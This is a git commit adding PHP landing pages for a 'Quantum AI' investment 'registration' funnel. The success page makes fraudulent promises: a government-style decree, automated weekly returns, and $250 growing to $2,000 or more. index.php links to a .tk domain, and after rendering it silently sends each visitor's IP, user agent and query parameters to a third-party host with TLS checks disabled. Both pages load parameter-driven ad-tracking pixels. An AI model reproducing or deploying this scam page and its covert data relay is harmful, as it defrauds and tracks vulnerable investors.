6e0e95ddd41b24fb5076e6d7fac19ef15fb79438
adspower1 <106076170+adspower1@users.noreply.github.com>
2022-08-02 14:06:04 +0300

    Add files via upload

---
+++ index.php
@@ -0,0 +1,120 @@
+<?php
+$pixels = [ 'fb', 'fbe', 'ga', 'gad', 'mt', 'mtrk', 'tt', 'vk' ];
+foreach ( $pixels as $px ) if (isset( $_GET[$px] )) {
+	$z = preg_replace( '#[^0-9A-Za-z\-\_\.\,]+#i', '', stripslashes(filter_var( $_GET[$px], FILTER_SANITIZE_STRING )) );
+	if ( $z ) setcookie( $px, $z, time() + 2592000, '/' );
+}
+?><?php
+$url = "//toefundlywighca.tk/quantumai-registration/info/?flow=259&" . http_build_query($_GET);
+?><!DOCTYPE html>
+<html lang="en">
+<head>
+
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-NWFQTZM');</script>
+<!-- End Google Tag Manager -->
+
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>step 1</title>
+  <link rel="stylesheet" href="css/style.css">
+
+</head>
+<body style="background-image: url('img/bg.png');">
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-NWFQTZM"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <div class="logo-wrap">
+    <a  href="" class="logo">Quantum AI</a>
+  </div>
+  <div class="container">
+    <div class="step-1">
+      <h1 class="title">Welcome to the  <br> Quantum AI platform!</h1>
+      <p class="descr">To start working you need to pass the registration process:</p>
+      <img src="img/laptop.png" class="step-1__image" alt="">
+      <ul class="stepper">
+        <li class="active">Step 1</li>
+        <li>Step 2</li>
+        <li>Step 3</li>
+      </ul>
+      <a  href="step2.php" class="btn">REGISTRATION</a>
+    </div>
+  </div>
+    <footer class="footer">
+      <div class="footer__container">
+        <ul>
+          <li><img src="./img/icon-1.png" alt=""></li>
+          <li><img src="./img/icon-2.png" alt=""></li>
+          <li><img src="./img/icon-3.png" alt=""></li>
+          <li><img src="./img/icon-4.png" alt=""></li>
+          <li><img src="./img/icon-5.png" alt=""></li>
+        </ul>
+      </div>
+    </footer>
+  
+<?php
+$pixl = array (
+  'fb' => '',
+  'fbe' => 'Lead',
+  'ga' => '',
+  'gad' => '',
+  'tt' => '',
+  'vk' => '',
+  'mt' => '',
+  'mtrk' => '',
+);
+$isbad = isset($_GET['id']) && substr( $_GET['id'], 0, 1 ) == '0';
+if ( isset($_GET['status']) && $_GET['status'] == 'error' ) $isbad = true;
+foreach ( $pixl as $px => $df ) if ( $isbad ) {
+	$$px = false;
+} elseif (isset( $_GET[$px] )) {
+	$$px = preg_replace( '#[^0-9A-Za-z\-\_\.\,]+#i', '', stripslashes(filter_var( $_GET[$px], FILTER_SANITIZE_STRING )) );
+} elseif (isset( $_COOKIE[$px] )) {
+	$$px = preg_replace( '#[^0-9A-Za-z\-\_\.\,]+#i', '', stripslashes(filter_var( $_COOKIE[$px], FILTER_SANITIZE_STRING )) );
+} else $$px = $df;
+if ( $fb ) {
+	?><script>!function(f,b,e,v,n,t,s) {if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)}; if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0'; n.queue=[];t=b.createElement(e);t.async=!0; t.src=v;s=b.getElementsByTagName(e)[0]; s.parentNode.insertBefore(t,s)}(window, document,'script','https://connect.facebook.net/en_US/fbevents.js'); <?php
+	foreach ( $fb as $f ) if ( $f = trim($f) ) :
+	?> fbq('init', '<?=$f;?>'); <?php
+	endif;
+	?> fbq('track', 'PageView'); setTimeout( fbq, 30000, 'track', 'ViewContent' );</script><noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=<?=$fb;?>&ev=PageView&noscript=1" /></noscript><?php
+}
+if ( $ga ) {
+	$gtm = ( strtolower(substr( $ga, 0, 3 )) == 'gtm' ) ? 1 : 0;
+	if ( $gtm ) {
+		?><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f); })(window,document,'script','dataLayer','<?=$ga;?>');</script><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=<?=$ga;?>" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript><?php
+	} else {
+		?><script async src="https://www.googletagmanager.com/gtag/js?id=<?=$ga;?>"></script><script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments)}; gtag('js', new Date()); gtag('config', '<?=$ga;?>');</script><?php
+	}
+}
+if ( $tt ) {
+	?><script> !function (w, d, t) {  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var i="https://analytics.tiktok.com/i18n/pixel/events.js";ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=i,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};var o=document.createElement("script");o.type="text/javascript",o.async=!0,o.src=i+"?sdkid="+e+"&lib="+t;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(o,a)}; ttq.load('<?=$tt;?>'); ttq.page(); }(window, document, 'ttq'); </script><?php
+}
+if ( $vk ) {
+	?><script type="text/javascript">!function(){var t=document.createElement("script");t.type="text/javascript",t.async=!0,t.src='https://vk.com/js/api/openapi.js?169',t.onload=function(){VK.Retargeting.Init("<?=$vk;?>"),VK.Retargeting.Hit()},document.head.appendChild(t)}();</script><noscript><img src="https://vk.com/rtrg?p=<?=$vk;?>" style="position:fixed; left:-999px;" alt=""/></noscript><?php
+}
+if ( $mt ) {
+	?><script type="text/javascript"> var _tmr = window._tmr || (window._tmr = []); _tmr.push({id: "<?=$mt;?>", type: "pageView", start: (new Date()).getTime(), pid: "USER_ID"}); (function (d, w, id) { if (d.getElementById(id)) return; var ts = d.createElement("script"); ts.type = "text/javascript"; ts.async = true; ts.id = id; ts.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//top-fwz1.mail.ru/js/code.js"; var f = function () {var s = d.getElementsByTagName("script")[0]; s.parentNode.insertBefore(ts, s);}; if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, false); } else { f(); } })(document, window, "topmailru-code");</script><noscript><div><img src="//top-fwz1.mail.ru/counter?id=<?=$mt;?>;js=na" style="border:0;position:absolute;left:-9999px;" alt="" /></div></noscript><?php
+}
+if ( $mtrk ) {
+	?><script type="text/javascript" > (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)}; m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)}) (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym"); ym(<?=$mtrk;?>, "init", { clickmap:true, trackLinks:true, accurateTrackBounce:true, webvisor:true }); </script><noscript><div><img src="https://mc.yandex.ru/watch/<?=$mtrk;?>" style="position:absolute; left:-9999px;" alt="" /></div></noscript><?php
+}
+?></body>
+</html><?php
+$curl = curl_init( "https://livco.shop/quantumai-registration/info/?flow=259&only=code&" . http_build_query($_GET) );
+curl_setopt( $curl, CURLOPT_RETURNTRANSFER, true );
+curl_setopt( $curl, CURLOPT_USERAGENT, $_SERVER["HTTP_USER_AGENT"] );
+curl_setopt( $curl, CURLOPT_HTTPHEADER, [ "X-Real-IP: " . $_SERVER["HTTP_CF_CONNECTING_IP"] ? $_SERVER["HTTP_CF_CONNECTING_IP"] : ( $_SERVER["HTTP_X_FORWARDED_FOR"] ? $_SERVER["HTTP_X_FORWARDED_FOR"] : $_SERVER["REMOTE_ADDR"] ) ] );
+curl_setopt( $curl, CURLOPT_SSL_VERIFYHOST, 0 );
+curl_setopt( $curl, CURLOPT_SSL_VERIFYPEER, 0 );
+curl_exec( $curl );
+curl_close( $curl );
+?>
---
+++ success.php
@@ -0,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-NWFQTZM');</script>
+<!-- End Google Tag Manager -->
+
+<
+
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Thank you</title>
+  <link rel="stylesheet" href="css/style.css">
+
+
+</head>
+<body style="background-image: url('img/step-3.png');">
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-NWFQTZM"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+
+<div class="logo-wrap">
+    <a href="/" class="logo">Quantum AI</a>
+  </div>
+  <div class="container step-3">
+      <img src="img/check.png" class="step-3__image" alt="">
+      <h1 class="ttl">Your application has been sent!</h1>
+      
+      <p class="step-3__descr">
+        Our managers will contact you as soon as possible
+      </p>
+
+      <ul class="stepper" style="margin-bottom: 71px;">
+        <li>Step 1</li>
+        <li>Step 2</li>
+        <li class="active">Step 3</li>
+      </ul>
+
+      <div class="info">
+        <h3>Quantum AI</h3>
+        <p style="margin-bottom: 134px">
+         Quantum AI has given every citizen over the age of 21 the opportunity to invest in the expansion of the Quantum AI network inside and outside of Australia. These measures will have a positive impact on the rate of expansion, share price growth and dividends for citizens, allowing both parties to generate good returns and develop a strong domestic system. The investments became available after management signed a decree effective April 15, 2022.
+        </p>
+        <h3></h3>
+        <p>
+         Every citizen now has the opportunity to earn shares in Quantum AI. It's important to note that this is a fully automated process based on the latest algorithm from Automation Anywhere, a company that has specialized in improving and robotizing business processes for years. You don't have to sit at your computer for hours or do any extra work, our financial system is fully automated and you get a clear percentage every week. In addition, you don't need to invest thousands, tens of thousands or even hundreds of thousands of dollars in quantum AI to generate income. You can invest a minimum of $250 and get $2,000 or more from that investment. We want to shape the future with you!
+        </p>
+      </div>
+
+  </div>
+    <footer class="footer">
+      <div class="footer__container">
+        <ul>
+          <li><img src="./img/icon-1.png" alt=""></li>
+          <li><img src="./img/icon-2.png" alt=""></li>
+          <li><img src="./img/icon-3.png" alt=""></li>
+          <li><img src="./img/icon-4.png" alt=""></li>
+          <li><img src="./img/icon-5.png" alt=""></li>
+        </ul>
+      </div>
+    </footer>
+  
+  <?php
+$pixl = array (
+  'fb' => '',
+  'fbe' => 'Lead',
+  'ga' => '',
+  'gad' => '',
+  'tt' => '',
+  'vk' => '',
+  'mt' => '',
+  'mtrk' => '',
+);
+$isbad = isset($_GET['id']) && substr( $_GET['id'], 0, 1 ) == '0';
+if ( isset($_GET['status']) && $_GET['status'] == 'error' ) $isbad = true;
+foreach ( $pixl as $px => $df ) if ( $isbad ) {
+	$$px = false;
+} elseif (isset( $_GET[$px] )) {
+	$$px = preg_replace( '#[^0-9A-Za-z\-\_\.\,]+#i', '', stripslashes(filter_var( $_GET[$px], FILTER_SANITIZE_STRING )) );
+} elseif (isset( $_COOKIE[$px] )) {
+	$$px = preg_replace( '#[^0-9A-Za-z\-\_\.\,]+#i', '', stripslashes(filter_var( $_COOKIE[$px], FILTER_SANITIZE_STRING )) );
+} else $$px = $df;
+if ( $fb ) {
+	$fb = explode( ',', $fb );
+	?><script>!function(f,b,e,v,n,t,s) {if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)}; if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0'; n.queue=[];t=b.createElement(e);t.async=!0; t.src=v;s=b.getElementsByTagName(e)[0]; s.parentNode.insertBefore(t,s)}(window, document,'script','https://connect.facebook.net/en_US/fbevents.js'); <?php
+	foreach ( $fb as $f ) if ( $f = trim($f) ) :
+	?> fbq('init', '<?=$f;?>'); <?php
+	endif;
+	?> fbq('track', 'PageView'); fbq('track', '<?=$fbe;?>'); </script><noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=<?=$fb;?>&ev=<?=$fbe;?>&noscript=1" /></noscript><?php
+}
+if ( $ga ) {
+	$gtm = ( strtolower(substr( $ga, 0, 3 )) == 'gtm' ) ? 1 : 0;
+	if ( $gtm ) {
+		?><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f); })(window,document,'script','dataLayer','<?=$ga;?>');</script><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=<?=$ga;?>" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript><?php
+	} elseif ( $gad ) {
+		?><script async src="https://www.googletagmanager.com/gtag/js?id=<?=$ga;?>"></script><script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments)}; gtag('js', new Date()); gtag('config', '<?=$ga;?>'); gtag('event', 'conversion', {'send_to': '<?=$ga;?>/<?=$gad;?>'});</script><?php
+	} else {
+		?><script async src="https://www.googletagmanager.com/gtag/js?id=<?=$ga;?>"></script><script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments)}; gtag('js', new Date()); gtag('config', '<?=$ga;?>');</script><?php
+	}
+}
+if ( $tt ) {
+	?><script> !function (w, d, t) {  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var i="https://analytics.tiktok.com/i18n/pixel/events.js";ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=i,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};var o=document.createElement("script");o.type="text/javascript",o.async=!0,o.src=i+"?sdkid="+e+"&lib="+t;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(o,a)}; ttq.load('<?=$tt;?>'); ttq.page(); }(window, document, 'ttq'); </script><?php
+}
+if ( $vk ) {
+	?><script type="text/javascript">!function(){var t=document.createElement("script");t.type="text/javascript",t.async=!0,t.src='https://vk.com/js/api/openapi.js?169',t.onload=function(){VK.Retargeting.Init("<?=$vk;?>"),VK.Retargeting.Hit(),VK.Retargeting.Event("lead"),VK.Goal("lead")},document.head.appendChild(t)}();</script><noscript><img src="https://vk.com/rtrg?p=<?=$vk;?>" style="position:fixed; left:-999px;" alt=""/></noscript><?php
+}
+if ( $mt ) {
+	?><script type="text/javascript"> var _tmr = window._tmr || (window._tmr = []); _tmr.push({id: "<?=$mt;?>", type: "pageView", start: (new Date()).getTime(), pid: "USER_ID"}); _tmr.push({ type: 'itemView', productid: 'offer', pagetype: 'purchase', list: '1' }); (function (d, w, id) { if (d.getElementById(id)) return; var ts = d.createElement("script"); ts.type = "text/javascript"; ts.async = true; ts.id = id; ts.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//top-fwz1.mail.ru/js/code.js"; var f = function () {var s = d.getElementsByTagName("script")[0]; s.parentNode.insertBefore(ts, s);}; if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, false); } else { f(); } })(document, window, "topmailru-code"); </script><noscript><div><img src="//top-fwz1.mail.ru/counter?id=<?=$mt;?>;js=na" style="border:0;position:absolute;left:-9999px;" alt="" /></div></noscript><?php
+}
+if ( $mtrk ) {
+	?><script type="text/javascript" > (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)}; m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)}) (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym"); ym(<?=$mtrk;?>, "init", { clickmap:true, trackLinks:true, accurateTrackBounce:true, webvisor:true }); </script><noscript><div><img src="https://mc.yandex.ru/watch/<?=$mtrk;?>" style="position:absolute; left:-9999px;" alt="" /></div></noscript><?php
+}
+?>
+</body>
+</html>
